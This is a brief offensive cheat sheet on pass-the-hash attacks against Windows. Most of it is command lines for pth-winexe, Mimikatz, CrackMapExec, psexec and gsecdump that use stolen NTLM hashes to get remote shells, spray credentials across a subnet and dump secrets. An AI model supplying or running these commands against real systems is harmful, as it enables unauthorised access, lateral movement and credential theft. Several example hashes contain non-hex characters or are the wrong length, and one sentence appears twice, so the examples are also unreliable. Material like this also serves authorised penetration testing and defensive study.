---
description: >-
  Pass the hash is a hacking technique that allows an attacker to authenticate
  to a remote server or service by using the underlying NTLM or LanMan hash of a
  user's password.
---

# Pass-The-Hash

It replaces the need for stealing the plaintext password with merely stealing the hash and using that to authenticate with.

## pth-winexec

Part of the pth-toolkit \([https://github.com/byt3bl33d3r/pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)\), buildin in kali

Example:

```text
pth-winexe --user=pc.local/Administrator%aad3b435b51404eeaad3b435b514t234e:1321ae011e02ab0k26e4edc5012deac8 //10.1.1.1 cmd
```

## Mimikatz

Pass-the-hash using mimikatz:

`Invoke-Mimikatz -Command '"sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:command"`

After running this command a new cmd shell will be opened with the new logon session \(can be seen by running `klist`\), we can interact with the new shell by running:

`Invoke-Command -ComputerName dc.eth.lab -ScriptBlock{whoami}`

It replaces the need for stealing the plaintext password with merely stealing the hash and using that to authenticate with.

## Crackmapexec

`cme smb 192.168.0.1/24 -u Admin -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949`

## psexec

part of Microsoft’s Sysinternals tools for windows or a standalone script in kali

`psexec.py active.htb/administrator@10.10.10.100`

## gsecdump

Gsecdump has no DLL dependency making it very easy to use on remote systems with psexec. If it for some reason can't do what it is supposed to, try running it as SYSTEM and you should get your info. 

Example: 

`C:\Documents and Settings\nobody\Desktop>gsecdump -u MSHOME\XPSP1VM$::aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::` 



